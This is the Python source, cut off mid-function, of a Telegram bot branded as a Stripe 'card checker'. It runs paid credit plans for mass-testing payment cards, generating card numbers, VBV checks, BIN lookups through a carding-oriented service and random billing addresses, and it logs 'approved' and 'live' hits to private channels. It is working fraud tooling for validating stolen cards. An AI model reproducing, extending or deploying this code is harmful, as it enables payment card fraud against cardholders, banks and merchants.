import asyncio
import json
import random
from datetime import datetime as dt, timezone
import datetime
import time
import os
from dotenv import load_dotenv
import re
import sys
import urllib.parse
import aiohttp
import string
import uuid
from io import BytesIO
from bs4 import BeautifulSoup
from mimesis import Generic as Gen
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode
from telegram.error import NetworkError, BadRequest, TimedOut
import logging
from telegram.helpers import escape_markdown
import firebase_admin
from firebase_admin import credentials, firestore
from google.cloud import firestore
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import requests
from pathlib import Path
import hashlib
import base64

load_dotenv()


def init_firebase():
    """Initialize Firebase and return connection status"""
    try:
        firebase_config = {
            "type": os.getenv("FIREBASE_TYPE", "service_account"),
            "project_id": os.getenv("FIREBASE_PROJECT_ID", ""),
            "private_key_id": os.getenv("FIREBASE_PRIVATE_KEY_ID", ""),
            "private_key": os.getenv("FIREBASE_PRIVATE_KEY", "").replace("\\n", "\n")
            if os.getenv("FIREBASE_PRIVATE_KEY")
            else "",
            "client_email": os.getenv("FIREBASE_CLIENT_EMAIL", ""),
            "client_id": os.getenv("FIREBASE_CLIENT_ID", ""),
            "auth_uri": os.getenv(
                "FIREBASE_AUTH_URI", "https://accounts.google.com/o/oauth2/auth"
            ),
            "token_uri": os.getenv(
                "FIREBASE_TOKEN_URI", "https://oauth2.googleapis.com/token"
            ),
            "auth_provider_x509_cert_url": os.getenv(
                "FIREBASE_AUTH_PROVIDER_CERT_URL",
                "https://www.googleapis.com/oauth2/v1/certs",
            ),
            "client_x509_cert_url": os.getenv("FIREBASE_CLIENT_CERT_URL", ""),
        }

        has_firebase_creds = any(
            [
                firebase_config.get("project_id"),
                firebase_config.get("private_key"),
                firebase_config.get("client_email"),
            ]
        )

        if not has_firebase_creds:
            print("ℹ️  No Firebase credentials found. Using in-memory storage.")
            return None, False

        required_fields = ["project_id", "private_key", "client_email"]
        missing_fields = []

        for field in required_fields:
            if not firebase_config.get(field):
                missing_fields.append(field)

        if missing_fields:
            print(f"⚠️  Missing Firebase config fields: {', '.join(missing_fields)}")
            print("⚠️  Using in-memory storage (data will be lost on restart)")
            return None, False

        cred = credentials.Certificate(firebase_config)
        firebase_admin.initialize_app(cred)
        db = firestore.client()
        print("✅ Firebase connected successfully")

        test_ref = db.collection("test").document("connection_test")
        test_ref.set({"test": True, "timestamp": datetime.datetime.now().isoformat()})
        print("✅ Firebase write test successful")

        return db, True
    except Exception as e:
        print(f"⚠️  Firebase connection failed: {e}")
        print("⚠️  Using in-memory storage (data will be lost on restart)")
        return None, False


# Initialize Firebase
db, firebase_connected = init_firebase()


def get_db():
    """Get Firebase database instance"""
    return db


# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONSTANTS ====================
ENCRYPTION_SALT = os.getenv("ENCRYPTION_SALT", "darkxcode_salt_2024")
ENCRYPTION_PASSWORD = os.getenv("ENCRYPTION_PASSWORD", "darkxcode_encryption_key")
DECRYPTION_WEBSITE = os.getenv(
    "DECRYPTION_WEBSITE", "https://kumarjii1546-glitch.github.io/darkxcode-decrypt/"
)
RECEIVED_FOLDER = "received"
PUBLIC_HITS_FOLDER = "hits/public"
PRIVATE_HITS_FOLDER = "hits/private"
USER_LOGS_FOLDER = "user_logs"
APPROVED_LOG_CHANNEL = -1003882471203
PRIVATE_LOG_CHANNEL = -1003898549508
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")
DOMAIN = "jogoka.com"
PK = os.getenv(
    "STRIPE_PK",
    "")

# Create folders
Path(RECEIVED_FOLDER).mkdir(exist_ok=True, parents=True)
Path(PUBLIC_HITS_FOLDER).mkdir(exist_ok=True, parents=True)
Path(PRIVATE_HITS_FOLDER).mkdir(exist_ok=True, parents=True)
Path(USER_LOGS_FOLDER).mkdir(exist_ok=True, parents=True)

# ==================== CREDIT COSTS ====================
CREDIT_COSTS = {
    "approved": 3,
    "live": 3,
    "ccn": 2,
    "cvv": 2,
    "dead": 1,
    "risk": 1,
    "fraud": 1,
    "call_issuer": 1,
    "cannot_auth": 1,
    "processor_declined": 1,
}

STATUS_MAPPING = {
    "approved": "Auth Success",
    "live": "Insufficient Funds",
    "dead": "Card Declined",
    "ccn": "Invalid Card Number",
    "cvv": "CVV Incorrect",
    "risk": "Gateway Rejected: risk_threshold",
    "fraud": "Fraud Suspected",
    "call_issuer": "Declined - Call Issuer",
    "cannot_auth": "Cannot Authorize at this time",
    "processor_declined": "Processor Declined",
}

# Bot info
BOT_INFO = {
    "name": "⚡ DARKXCODE STRIPE CHECKER ⚡",
    "version": "3.1",
    "creator": "@ISHANT_OFFICIAL",
    "gates": "Stripe Auth",
    "features": "• New Credit System\n• Card Generator\n• Card VBV Check\n• Daily Credits & Leaderboards\n• Upgradeable Plans\n• Fast Single Check\n• Mass Checks\n• Real-time Statistics\n• Invite & Earn System\n",
}

# In-memory storage
checking_tasks = {}
files_storage = {}
setup_intent_cache = {}
last_cache_time = 0

# In-memory storage as fallback
in_memory_users = {}
in_memory_gift_codes = {}
in_memory_claimed_codes = {}
in_memory_bot_stats = {
    "total_checks": 0,
    "total_credits_used": 0,
    "total_approved": 0,
    "total_live": 0,
    "total_ccn": 0,
    "total_cvv": 0,
    "total_declined": 0,
    "total_users": 0,
    "start_time": datetime.datetime.now().isoformat(),
}

PLAN_CONFIGS = {
    "free": {
        "daily_credits": 100,
        "mass_check_limit": 100,
        "max_concurrent": 1,
        "proxy_type": "http",
        "speed_tier": "slow",
        "daily_gen_limit": 1000,
        "daily_vbv_limit": 5,
        "price": 0,
    },
    "basic": {
        "daily_credits": 500,
        "mass_check_limit": 500,
        "max_concurrent": 2,
        "proxy_type": "socks4",
        "speed_tier": "medium",
        "daily_gen_limit": 5000,
        "daily_vbv_limit": 20,
        "price": 10,
    },
    "pro": {
        "daily_credits": 2000,
        "mass_check_limit": 9999,
        "max_concurrent": 3,
        "proxy_type": "socks5",
        "speed_tier": "fast",
        "daily_gen_limit": 10000,
        "daily_vbv_limit": 100,
        "price": 25,
    },
}

# User-Agent rotation list
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
]

# Billing addresses for different card locations (simplified)
BILLING_ADDRESSES = {
    "US": [
        {
            "name": "Waiyan",
            "postal_code": "10080",
            "city": "Bellevue",
            "state": "NY",
            "country": "US",
            "address_line_1": "7246 Royal Ln",
        },
        {
            "name": "John Smith",
            "postal_code": "10001",
            "city": "New York",
            "state": "NY",
            "country": "US",
            "address_line_1": "123 Main St",
        },
        {
            "name": "Michael Johnson",
            "postal_code": "90210",
            "city": "Beverly Hills",
            "state": "CA",
            "country": "US",
            "address_line_1": "456 Sunset Blvd",
        },
    ],
    "UK": [
        {
            "name": "James Wilson",
            "postal_code": "SW1A 1AA",
            "city": "London",
            "state": "England",
            "country": "GB",
            "address_line_1": "10 Downing Street",
        },
        {
            "name": "Thomas Brown",
            "postal_code": "M1 1AA",
            "city": "Manchester",
            "state": "England",
            "country": "GB",
            "address_line_1": "25 Oxford Rd",
        },
    ],
}

# Database connection pool
db_pool = None


def parseX(data, start, end):
    try:
        if not data or not start or not end:
            return None
        if start not in data:
            return None
        star = data.index(start) + len(start)
        if end not in data[star:]:
            return None
        last = data.index(end, star)
        return data[star:last]
    except (ValueError, TypeError, AttributeError):
        return None


def magneto_check(number: str) -> bool:
    """Validate card number using Luhn algorithm"""
    digits = "".join(ch for ch in number if ch.isdigit())
    if not digits:
        return False
    total = 0
    reverse = digits[::-1]
    for i, ch in enumerate(reverse):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def generate_gift_code(length=16):
    """Generate a random gift code"""
    characters = string.ascii_uppercase + string.digits
    return "".join(random.choice(characters) for _ in range(length))


def get_billing_address(card_bin=""):
    """Get random billing address based on card BIN or random country"""
    # Default to US if no BIN or unknown BIN
    if not card_bin or len(card_bin) < 6:
        country = random.choice(list(BILLING_ADDRESSES.keys()))
    else:
        # Simple BIN to country mapping
        bin_prefix = card_bin[:2]
        if bin_prefix in ["40", "41", "42", "43", "44", "45", "46", "47", "48", "49"]:
            country = "US"  # Visa
        elif bin_prefix in ["51", "52", "53", "54", "55"]:
            country = "US"  # Mastercard
        elif bin_prefix in ["34", "37"]:
            country = "US"  # Amex
        elif bin_prefix in ["60", "65"]:
            country = "US"  # Discover/RuPay
        else:
            country = "US"  # Default to US

    # Make sure the country exists in our addresses
    if country not in BILLING_ADDRESSES:
        country = "US"

    return random.choice(BILLING_ADDRESSES[country])


# ==================== SIMPLE ROTATION ENCRYPTION ====================


def simple_rotate_encrypt(card_string):
    """Simple character rotation encryption for web compatibility"""
    try:
        # Simple rotation by 5 positions + base64
        rotated = []
        for char in card_string:
            if char.isdigit():
                # Rotate digits 0-9
                rotated.append(str((int(char) + 5) % 10))
            elif char == "|":
                rotated.append("$")  # Replace | with $
            elif char.isalpha():
                # Rotate letters
                base = ord("a") if char.islower() else ord("A")
                rotated.append(chr((ord(char) - base + 5) % 26 + base))
            else:
                rotated.append(char)

        rotated_text = "".join(rotated)

        # Add prefix for identification
        return f"DXC_{rotated_text}"

    except Exception as e:
        logger.error(f"Rotation encryption error: {e}")
        return card_string


def encrypt_card_data(card_string):
    """Main encryption function"""
    return simple_rotate_encrypt(card_string)


def decrypt_card_data(encrypted_string):
    """Decryption for website"""
    if encrypted_string.startswith("DXC_"):
        encrypted = encrypted_string[4:]  # Remove DXC_ prefix
        decrypted = []
        for char in encrypted:
            if char.isdigit():
                # Reverse digit rotation
                decrypted.append(str((int(char) - 5) % 10))
            elif char == "$":
                decrypted.append("|")  # Restore |
            elif char.isalpha():
                # Reverse letter rotation
                base = ord("a") if char.islower() else ord("A")
                decrypted.append(chr((ord(char) - base - 5) % 26 + base))
            else:
                decrypted.append(char)
        return "".join(decrypted)
    return encrypted_string


def create_decryption_button(encrypted_card):
    """Create inline button for decryption website"""
    import urllib.parse

    encoded_card = urllib.parse.quote(encrypted_card)
    decryption_url = f"{DECRYPTION_WEBSITE}/?data={encoded_card}"
    
    return InlineKeyboardButton("🔓 Decrypt Card", url=decryption_url)

async def backup_database():
    """Create a backup of the database"""
    if not firebase_connected:
        return False

    try:
        db = get_db()
        backup_data = {}

        # Backup each collection
        collections = ["users", "gift_codes", "bot_statistics"]

        for collection_name in collections:
            backup_data[collection_name] = {}
            docs = db.collection(collection_name).stream()

            for doc in docs:
                backup_data[collection_name][doc.id] = doc.to_dict()

        # Save backup to file
        backup_file = f"backup_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(backup_file, "w") as f:
            json.dump(backup_data, f, indent=2, default=str)

        logger.info(f"Backup created: {backup_file}")
        return backup_file

    except Exception as e:
        logger.error(f"Backup failed: {e}")
        return False


async def restore_database(backup_file):
    """Restore database from backup"""
    if not firebase_connected:
        return False

    try:
        with open(backup_file, "r") as f:
            backup_data = json.load(f)

        db = get_db()

        for collection_name, documents in backup_data.items():
            for doc_id, data in documents.items():
                doc_ref = db.collection(collection_name).document(doc_id)
                doc_ref.set(data)

        logger.info(f"Database restored from {backup_file}")
        return True

    except Exception as e:
        logger.error(f"Restore failed: {e}")
        return False

    return InlineKeyboardButton("🔓 Decrypt Card", url=decryption_url)


async def can_start_mass_check(user_id):
    """Check if user can start a new mass check"""
    user = await get_user(user_id)

    # Admin bypass
    if user_id in ADMIN_IDS:
        return True, "✅ Admin can start unlimited checks"

    # Check active checks
    if user["active_checks"] >= user["max_concurrent"]:
        return False, f"❌ You can only run {user['max_concurrent']} check(s) at a time"

    # Check if free user already has active check
    if user["plan"] == "free" and user["active_checks"] > 0:
        return False, "❌ Free users can only run 1 mass check at a time"

    return True, "✅ You can start a new check"


async def increment_active_checks(user_id):
    """Increment active checks counter"""
    user = await get_user(user_id)
    updates = {"active_checks": user.get("active_checks", 0) + 1}
    await update_user(user_id, updates)


async def decrement_active_checks(user_id):
    """Decrement active checks counter"""
    user = await get_user(user_id)
    current = user.get("active_checks", 0)
    if current > 0:
        updates = {"active_checks": current - 1}
        await update_user(user_id, updates)


async def check_daily_reset(user_id):
    """Check and reset daily limits if needed"""
    user = await get_user(user_id)
    now = datetime.datetime.now()

    # Check if we need to reset daily counters
    if user.get("last_daily_reset"):
        last_reset = datetime.datetime.fromisoformat(user["last_daily_reset"])
        if (now - last_reset).days >= 1:
            # Reset daily counters
            updates = {
                "credits_used_today": 0,
                "gen_used_today": 0,
                "vbv_used_today": 0,
                "checks_today": 0,
                "last_daily_reset": now.isoformat(),
            }
            # Add daily credits for plan
            if user["plan"] in PLAN_CONFIGS:
                updates["credits"] = (
                    user.get("credits", 0) + PLAN_CONFIGS[user["plan"]]["daily_credits"]
                )

            await update_user(user_id, updates)
            return True

    # Initialize if never reset
    elif user.get("last_daily_reset") is None:
        updates = {
            "last_daily_reset": now.isoformat(),
            "credits_used_today": 0,
            "gen_used_today": 0,
            "vbv_used_today": 0,
            "checks_today": 0,
        }
        await update_user(user_id, updates)

    return False


async def daily_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Claim daily credits based on active plan"""
    user_id = update.effective_user.id
    user = await get_user(user_id)

    # Check if user has already claimed today
    now = datetime.datetime.now()
    today = now.date().isoformat()

    last_claim_date = user.get("last_daily_claim")

    if last_claim_date == today:
        # Already claimed today
        next_reset = now + datetime.timedelta(days=1)
        next_reset_time = next_reset.replace(hour=0, minute=0, second=0, microsecond=0)
        seconds_left = (next_reset_time - now).seconds
        hours_left = seconds_left // 3600
        minutes_left = (seconds_left % 3600) // 60

        response = f"""
<b>❌ ALREADY CLAIMED TODAY</b>
══════════════════════
You have already claimed your daily credits today.

<b>Next claim available in:</b> {hours_left}h {minutes_left}m
<b>Resets at:</b> 00:00 UTC

<b>Your Current Plan:</b> {user['plan'].upper()}
<b>Daily Credits:</b> {PLAN_CONFIGS[user['plan']]['daily_credits']}
<b>Total Credits:</b> {user['credits']}
"""
        await update.message.reply_text(response, parse_mode=ParseMode.HTML)
        return

    # Determine daily credits based on plan
    plan = user["plan"]
    daily_credits = PLAN_CONFIGS[plan]["daily_credits"]

    # Add daily credits
    new_credits = user.get("credits", 0) + daily_credits
    updates = {
        "credits": new_credits,
        "last_daily_claim": today,
        "total_daily_claims": user.get("total_daily_claims", 0) + 1,
    }

    # Calculate streak
    last_claim = user.get("last_daily_claim")
    streak = 1
    if last_claim:
        # Check if last claim was yesterday
        try:
            last_date = (
                datetime.datetime.fromisoformat(last_claim).date()
                if isinstance(last_claim, str)
                else last_claim
            )
            yesterday = (datetime.datetime.now() - datetime.timedelta(days=1)).date()
            if last_date == yesterday:
                streak = user.get("daily_streak", 0) + 1
            else:
                streak = 1  # Reset streak
        except:
            streak = 1
    else:
        streak = 1

    updates["daily_streak"] = streak

    await update_user(user_id, updates)

    # Bonus for streak
    bonus_info = ""
    bonus_credits = 0

    if streak % 7 == 0:  # Weekly bonus
        bonus = daily_credits * 2
        bonus_credits = bonus
        new_credits += bonus
        await update_user(user_id, {"credits": new_credits})
        bonus_info = f"\n🎉 <b>7-Day Streak Bonus:</b> +{bonus} credits"
    elif streak % 30 == 0:  # Monthly bonus
        bonus = daily_credits * 5
        bonus_credits = bonus
        new_credits += bonus
        await update_user(user_id, {"credits": new_credits})
        bonus_info = f"\n🎊 <b>30-Day Streak Bonus:</b> +{bonus} credits"

    # Update user again with final credits
    user = await get_user(user_id)

    # Create response message
    response = f"""
<b>🎯 DAILY CREDITS CLAIMED!</b>
══════════════════════
<b>Plan:</b> {plan.upper()}
<b>Daily Credits:</b> {daily_credits}
<b>Claimed:</b> ✅ Success
{bonus_info}
━━━━━━━━━━━━━━━━━━━━
<b>New Balance:</b> {user['credits']} credits
<b>Daily Streak:</b> {streak} days
━━━━━━━━━━━━━━━━━━━━
<b>Next Claim:</b> Tomorrow (00:00 UTC)
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot:</b> @DARKXCODE_STRIPE_BOT
══════════════════════
"""

    # Add plan upgrade suggestion for free users
    if plan == "free":
        response += f"""
<code>💡 Want more daily credits?</code>
Upgrade to:
• <b>Basic:</b> 500 credits/day
• <b>Pro:</b> 2000 credits/day
Use <code>/plans</code> to see details
"""

    await update.message.reply_text(response, parse_mode=ParseMode.HTML)


async def send_daily_reminders(context: ContextTypes.DEFAULT_TYPE):
    """Send reminders to users who haven't claimed daily"""
    try:
        # This would require tracking all users
        # For simplicity, you can implement basic version

        logger.info("Daily reminder check running...")

        # Example: Get users who claimed yesterday but not today
        # In production, query database

    except Exception as e:
        logger.error(f"Daily reminder error: {e}")


def get_credit_cost(status, command_type="check"):
    """Get credit cost based on status and command type"""
    if command_type == "check":
        # Only charge for approved/live cards
        if status.lower() in ["approved", "live"]:
            return 3
        else:
            return 0  # All declined cards are free

    elif command_type == "vbv":
        return 5  # VBV always costs 5 credits

    elif command_type == "gen":
        # This should be calculated separately based on count
        return 0  # Base cost (always free)

    return 0  # Default fallback (free)


def format_universal_result(
    card_data,
    status,
    message=None,
    gateway="Stripe Auth",
    username=None,
    time_taken=None,
    credits_left=None,  # Add this parameter
):
    """Format card result with all parameters"""
    try:
        # Parse card data
        if isinstance(card_data, str):
            if "|" in card_data:
                cc, mon, year, cvv = card_data.split("|")
            else:
                cc = card_data
                mon = "01"
                year = "25"
                cvv = "123"
        elif isinstance(card_data, (tuple, list)):
            if len(card_data) >= 4:
                cc, mon, year, cvv = card_data[:4]
            else:
                cc = card_data[0] if card_data else "0000000000000000"
                mon = "01"
                year = "25"
                cvv = "123"
        else:
            cc = "0000000000000000"
            mon = "01"
            year = "25"
            cvv = "123"

        cc_clean = cc.replace(" ", "")

        # Get BIN info
        bin_info = get_bin_info(cc_clean[:6])

        # Determine status and response
        status_display = status.capitalize()
        response_msg = STATUS_MAPPING.get(
            status.lower(), str(message)[:50] if message else status.capitalize()
        )

        # Format time
        if time_taken is None:
            time_taken = random.uniform(0.5, 0.8)

        # Build the result
        result = f"""
[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
[↯] Status: {status_display}
[↯] Response: {response_msg}
[↯] Gateway: {gateway}
- - - - - - - - - - - - - - - - - - - - - -
[↯] Bank: {bin_info['bank']}
[↯] Country: {bin_info['country']} {bin_info['country_flag']}
- - - - - - - - - - - - - - - - - - - - - -
[↯] 𝐓𝐢𝐦𝐞: {time_taken:.2f}s
"""

        # Add credits left if provided
        if credits_left is not None:
            result += f"[↯] Credits Left: {credits_left}\n"

        result += f"""[↯] User : @{username or 'N/A'}
[↯] Made By: @ISHANT_OFFICIAL
[↯] Bot: @DARKXCODE_STRIPE_BOT
"""

        return result

    except Exception as e:
        logger.error(f"Error in format_universal_result: {e}")
        return f"[↯] Error: {str(e)[:50]}"


def random_email():
    """Generate random email"""
    names = ["Kmo", "Waiyan", "John", "Mike", "David", "Sarah"]
    random_name = random.choice(names)
    random_numbers = "".join(str(random.randint(0, 9)) for _ in range(4))
    return f"{random_name}{random_numbers}@gmail.com"


def get_bin_info(bin_number):
    """Get BIN information from antipublic.cc"""
    try:
        if not bin_number or len(bin_number) < 6:
            return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}

        response = requests.get(
            f"https://bins.antipublic.cc/bins/{bin_number[:6]}", timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country", "Unknown"),
                "country_flag": data.get("country_flag", "🏳️"),
            }
    except Exception as e:
        logger.error(f"BIN API error: {e}")

    return {"bank": "Unknown", "country": "Unknown", "country_flag": "🏳️"}


async def get_user(user_id):
    """Get user from Firebase or memory with plan support"""
    db = get_db()

    if db:
        try:
            user_ref = db.collection("users").document(str(user_id))
            user_doc = user_ref.get()

            if user_doc.exists:
                user_data = user_doc.to_dict()
                # Ensure all plan fields exist
                user_data = ensure_plan_fields(user_data)
                return user_data
            else:
                # Create new user with default free plan
                new_user = create_default_user(user_id)
                user_ref.set(new_user)

                # Update bot statistics
                await update_total_users_stats()
                return new_user

        except Exception as e:
            logger.error(f"Firebase error in get_user: {e}")

    # Fallback to in-memory storage
    if user_id not in in_memory_users:
        in_memory_users[user_id] = create_default_user(user_id)
        in_memory_bot_stats["total_users"] += 1

    # Ensure plan fields exist
    in_memory_users[user_id] = ensure_plan_fields(in_memory_users[user_id])
    return in_memory_users[user_id]


def create_default_user(user_id):
    """Create a new user with complete schema"""
    return {
        # Basic Info
        "user_id": user_id,
        "username": "",
        "first_name": "",
        "joined_date": datetime.datetime.now().isoformat(),
        "last_active": datetime.datetime.now().isoformat(),
        # Credits & Plan
        "credits": 0,
        "credits_spent": 0,
        "plan": "free",
        "plan_expiry": None,
        "daily_credits": 100,
        "credits_used_today": 0,
        # Daily System
        "last_daily_claim": None,
        "total_daily_claims": 0,
        "daily_streak": 0,
        # Limits
        "daily_gen_limit": 200,
        "gen_used_today": 0,
        "daily_vbv_limit": 5,
        "vbv_used_today": 0,
        "mass_check_limit": 100,
        "max_concurrent": 1,
        "active_checks": 0,
        # Statistics
        "total_checks": 0,
        "approved_cards": 0,
        "live_cards": 0,
        "declined_cards": 0,
        "ccn_cards": 0,
        "cvv_cards": 0,
        "risk_cards": 0,
        "fraud_cards": 0,
        "checks_today": 0,
        "last_check_date": None,
        # Referral System
        "joined_channel": False,
        "referrer_id": None,
        "referrals_count": 0,
        "earned_from_referrals": 0,
        # Settings
        "proxy_type": "http",
        "speed_tier": "slow",
        # Purchase History
        "purchase_history": [],
        # Security (initialize empty)
        "ip_addresses": [],
        "device_fingerprint": "",
    }


def ensure_plan_fields(user_data):
    """Ensure all plan-related fields exist in user data"""
    default_user = create_default_user(user_data.get("user_id", 0))

    for key in default_user:
        if key not in user_data:
            user_data[key] = default_user[key]

    # Update plan config if plan exists
    if "plan" in user_data and user_data["plan"] in PLAN_CONFIGS:
        plan_config = PLAN_CONFIGS[user_data["plan"]]
        for key in plan_config:
            user_data[key] = plan_config[key]

    return user_data


async def update_user(user_id, updates):
    """Update user data in Firebase or memory"""
    db = get_db()

    # Convert datetime.date to string for Firebase
    processed_updates = updates.copy()
    for key, value in updates.items():
        if isinstance(value, datetime.date):
            processed_updates[key] = value.isoformat()
        elif isinstance(value, datetime.datetime):
            processed_updates[key] = value.isoformat()

    if db:
        try:
            user_ref = db.collection("users").document(str(user_id))

            if "last_active" in processed_updates:
                processed_updates["last_active"] = firestore.SERVER_TIMESTAMP
            else:
                processed_updates["last_active"] = firestore.SERVER_TIMESTAMP

            user_ref.update(processed_updates)
            return
        except Exception as e:
            logger.error(f"Firebase error in update_user: {e}")
            # Try without SERVER_TIMESTAMP as fallback
            try:
                user_ref = db.collection("users").document(str(user_id))
                if "last_active" in processed_updates:
                    processed_updates[
                        "last_active"
                    ] = datetime.datetime.now().isoformat()
                user_ref.update(processed_updates)
                return
            except Exception as e2:
                logger.error(f"Firebase fallback error in update_user: {e2}")

    # Fallback to in-memory storage
    if user_id in in_memory_users:
        in_memory_users[user_id].update(processed_updates)
        in_memory_users[user_id]["last_active"] = datetime.datetime.now().isoformat()


async def get_bot_stats():
    """Get bot statistics from Firebase with better error handling"""
    try:
        db = get_db()

        if db:
            try:
                stats_ref = db.collection("bot_statistics").document("stats")
                stats_doc = stats_ref.get()
                if stats_doc.exists:
                    stats_data = stats_doc.to_dict()

                    # Ensure all required fields exist
                    default_stats = {
                        "total_checks": 0,
                        "total_approved": 0,
                        "total_declined": 0,
                        "total_credits_used": 0,
                        "total_users": 0,
                        "start_time": datetime.datetime.now().isoformat(),
                    }

                    # Merge with defaults to ensure all keys exist
                    for key, value in default_stats.items():
                        if key not in stats_data:
                            stats_data[key] = value

                    return stats_data
            except Exception as e:
                logger.error(f"Firebase error in get_bot_stats: {e}")
                # Fall through to in-memory
    except Exception as e:
        logger.error(f"Error getting database in get_bot_stats: {e}")

    # Fallback to in-memory with safe defaults
    safe_stats = in_memory_bot_stats.copy()

    # Ensure all required fields exist
    required_fields = [
        "total_checks",
        "total_approved",
        "total_declined",
        "total_credits_used",
        "total_users",
        "start_time",
    ]
    for field in required_fields:
        if field not in safe_stats:
            if field == "start_time":
                safe_stats[field] = datetime.datetime.now().isoformat()
            else:
                safe_stats[field] = 0

    return safe_stats


async def update_bot_stats(updates):
    """Update bot statistics in Firebase with better error handling"""
    try:
        db = get_db()

        if db:
            try:
                stats_ref = db.collection("bot_statistics").document("stats")

                # First, check if document exists
                stats_doc = stats_ref.get()

                if not stats_doc.exists:
                    # Create document with initial values
                    initial_stats = {
                        "total_checks": 0,
                        "total_credits_used": 0,
                        "total_approved": 0,
                        "total_live": 0,
                        "total_ccn": 0,
                        "total_cvv": 0,
                        "total_declined": 0,
                        "total_users": 0,
                        "start_time": firestore.SERVER_TIMESTAMP,
                    }
                    stats_ref.set(initial_stats)

                # Prepare update dictionary with Increment operations
                firestore_updates = {}
                for key, value in updates.items():
                    firestore_updates[key] = firestore.Increment(value)

                # Update the document
                stats_ref.update(firestore_updates)
                return
            except Exception as e:
                logger.error(f"Firebase error in update_bot_stats: {e}")
    except Exception as e:
        logger.error(f"Error getting database in update_bot_stats: {e}")

    # Fallback to in-memory storage
    for key, value in updates.items():
        if key in in_memory_bot_stats:
            in_memory_bot_stats[key] += value
        else:
            in_memory_bot_stats[key] = value

async def update_total_users_stats():
    """Update total users count in bot statistics"""
    try:
        # Count total users
        total_users = 0
        
        if firebase_connected:
            db = get_db()
            users_ref = db.collection("users")
            docs = users_ref.stream()
            total_users = sum(1 for _ in docs)
        else:
            total_users = len(in_memory_users)
        
        # Update bot stats
        await update_bot_stats({"total_users": total_users})
        return total_users
    except Exception as e:
        logger.error(f"Error updating total users stats: {e}")
        return len(in_memory_users)

async def admindb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin database management dashboard"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "<b>❌ ACCESS DENIED</b>\nThis command is for administrators only.",
            parse_mode=ParseMode.HTML,
        )
        return

    dashboard_text = """
<b>👑 ADMIN DATABASE MANAGEMENT</b>
══════════════════════
<b>Available Commands:</b>

🔧 <b>Setup & Configuration:</b>
• <code>/createdb</code> - Initialize database structure
• <code>/checkdb</code> - Check database health
• <code>/backupdb</code> - Create database backup
• <code>/resetall</code> - Reset all data

📊 <b>Statistics & Monitoring:</b>
• <code>/botinfo</code> - Bot statistics
• <code>/userinfo</code> - User details
• <code>/listgifts</code> - List gift codes
• <code>/gengift</code> - Create gift code

⚙️ <b>User Management:</b>
• <code>/addcr ID AMOUNT</code> - Add credits
• <code>/setcr ID AMOUNT</code> - Set credits
• <code>/setplan ID PLAN DAYS</code> - Set user plan


══════════════════════
<b>Quick Actions:</b>
"""

    keyboard = [
        [
            InlineKeyboardButton("🔄 Check DB", callback_data="admin_checkdb"),
            InlineKeyboardButton("💾 Backup", callback_data="admin_backup"),
        ],
        [
            InlineKeyboardButton("🔧 Create DB", callback_data="admin_createdb"),
            InlineKeyboardButton("⚠️ Reset All", callback_data="admin_resetall"),
        ],
        [
            InlineKeyboardButton("📊 Stats", callback_data="admin_botinfo"),
            InlineKeyboardButton("🔙 Main", callback_data="admin_panel"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        dashboard_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
    )


# Add callback handlers for the dashboard
async def admin_checkdb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle checkdb from dashboard"""
    query = update.callback_query
    await query.answer()
    # Create a fake update object to call checkdb_command
    fake_update = Update(update_id=update.update_id, message=query.message)
    await checkdb_command(fake_update, context)


async def admin_createdb_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle createdb from dashboard"""
    query = update.callback_query
    await query.answer("Creating database...")
